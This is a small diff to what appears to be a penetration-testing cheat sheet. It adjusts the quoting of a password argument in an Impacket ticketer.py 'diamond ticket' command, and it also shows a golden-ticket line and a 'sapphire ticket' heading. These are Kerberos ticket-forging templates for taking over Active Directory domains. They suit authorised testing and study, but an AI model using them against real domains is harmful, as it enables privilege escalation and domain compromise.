@@ -68,7 +68,7 @@ ticketer.py -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> '
 ## ticketer diamond ticket
 #faketime
 ```
-ticketer.py -request -domain <domain> -user '<user>' -password <password> -nthash <nt_hash> -aesKey <aes_key> -domain-sid <domain_sid> -user-id <user_id> -groups <groups> <target_user>
+ticketer.py -request -domain <domain> -user '<user>' -password '<password>' -nthash <nt_hash> -aesKey <aes_key> -domain-sid <domain_sid> -user-id <user_id> -groups <groups> <target_user>
 ```
 
 ## ticketer sapphire ticket
